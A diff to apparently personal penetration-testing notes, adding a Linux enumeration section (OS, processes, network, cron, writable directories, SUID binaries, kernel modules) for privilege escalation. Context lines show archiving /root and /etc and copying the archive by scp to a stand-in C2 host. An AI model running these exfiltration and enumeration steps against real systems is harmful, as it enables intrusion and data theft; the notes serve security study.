@@ -180,6 +180,55 @@ tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
 scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 ```
 # Red
+## Situational awareness
+### Ogolne info
+#### System
+* The /etc/issue and /etc/*-release files contain information about the operating system release and version. We can also run the uname -a command - shows kernell version.
+#### Procesy
+* We can list system processes (including those run by privileged users) with the ps command. We'll use the a and x flags to list all processes with or without a tty and the u flag to list the processes in a user-readable format.
+#### Network
+* We can display network routing tables with either route or routel, depending on the Linux distribution and version.
+* Finally, we can display active network connections and listening ports using either netstat or ss, both of which accept the same arguments.
+For example, we can list all connections with -a, avoid hostname resolution (which may stall the command execution) with -n, and list the process name the connection belongs to with -p. We can combine the arguments and simply run 
+ss -anp
+#### Firewall
+* For example, the iptables-persistent package on Debian Linux saves firewall rules in specific files under /etc/iptables by default.
+#### Cron
+```bash
+ls -lah /etc/cron* # for active user
+sudo crontab -l # root
+```
+#### Applications
+```bash
+dpkg -l
+```
+* It is worth noting that system administrators often add their own scheduled tasks in the /etc/crontab file. These tasks should be inspected carefully for insecure file permissions, since most jobs in this file will run as root. To view the current user's scheduled jobs, we can run crontab followed by the -l parameter.
+```bash
+crontab -l
+```
+#### Searching
+* In the example below, we are searching for every directory writable by the current user on the target system. We'll search the whole root directory (/) and use the -writable argument to specify the attribute we are interested in. We can also use -type d to locate directories, and filter errors with 2>/dev/null:
+```bash
+find / -writable -type d 2>/dev/null
+```
+* On Linux-based systems, we can use mount to list all mounted filesystems. In addition, the /etc/fstab file lists all drives that will be mounted at boot time.
+* Furthermore, we can use lsblk to view all available disks.
+```bash
+lsblk
+```
+* SUID - (except rwx there's S) If these two rights are set, either an uppercase or lowercase "s" will appear in the permissions. This allows the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid). We can use find to search for SUID-marked binaries. In this case, we are starting our search at the root directory (/), searching for files (-type f) with the SUID bit set, (-perm -u=s) and discarding all error messages (2>/dev/null):
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+####  drivers and kernel modules
+```bash
+lsmod
+```
+* Once we've collected the list of loaded modules and identified those, we want more information about, such as libata in the above example, we can use modinfo to find out more about the specific module. We should note that this tool requires the full path to run.
+```bash
+/sbin/modinfo libata
+```
+#### SUID
 ## SHarphound BLoodhound
 ### bloodhound.py
 Sharphound data collector meant for linux
